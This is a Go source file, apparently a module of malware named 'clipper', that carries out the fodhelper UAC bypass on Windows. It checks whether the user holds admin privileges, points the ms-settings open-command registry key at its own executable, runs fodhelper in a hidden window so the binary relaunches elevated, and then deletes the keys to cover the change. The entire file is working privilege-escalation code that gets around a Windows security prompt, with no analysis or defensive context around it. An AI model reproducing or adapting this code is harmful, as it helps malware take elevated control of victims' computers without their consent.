package uac

import (
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"clipper/src/utils"
)

func canElevate() bool {
	var infoPointer unsafe.Pointer

	username, err := syscall.UTF16PtrFromString(os.Getenv("USERNAME"))
	if err != nil {
		return false
	}

	ret, _, _ := syscall.NewLazyDLL("netapi32.dll").NewProc("NetUserGetInfo").Call(
		0,
		uintptr(unsafe.Pointer(username)),
		1,
		uintptr(unsafe.Pointer(&infoPointer)),
	)

	if ret != 0 {
		return false
	}

	defer syscall.NewLazyDLL("netapi32.dll").NewProc("NetApiBufferFree").Call(uintptr(infoPointer))

	type userInfo1 struct {
		Username    *uint16
		Password    *uint16
		PasswordAge uint32
		Priv        uint32
		HomeDir     *uint16
		Comment     *uint16
		Flags       uint32
		ScriptPath  *uint16
	}

	info := (*userInfo1)(infoPointer)
	return info.Priv == 2
}

func elevate() error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer k.Close()

	value, err := os.Executable()
	if err != nil {
		return err
	}

	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		return err
	}

	err = k.DeleteValue("")
	if err != nil {
		return err
	}

	err = k.DeleteValue("DelegateExecute")
	if err != nil {
		return err
	}

	return nil
}

func Run() {
	if utils.IsElevated() {
		return
	}

	if !canElevate() {
		return
	}

	if err := elevate(); err != nil {
		return
	}

	os.Exit(0)
}